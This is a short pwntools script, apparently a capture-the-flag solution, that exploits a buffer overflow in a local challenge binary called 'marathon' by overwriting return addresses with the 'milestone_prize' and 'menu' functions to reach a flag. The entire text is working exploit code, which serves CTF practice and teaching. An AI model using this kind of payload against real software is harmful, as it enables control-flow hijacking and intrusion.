from pwn import *

# p = process("./marathon")
e  = ELF("./marathon")
p = remote("127.0.0.1", 10001)

print(p.recvuntil(b"cheat code: "))
p.sendline(b'1')
payload = 0x2c * b'A' + p32(e.symbols['milestone_prize']) * 18 + p32(e.symbols["menu"])
print(p.recvuntil(b"start?\n"))
p.sendline(payload)
p.interactive()

# Now input password and get flag or save p.recv() in a buffer and extract password

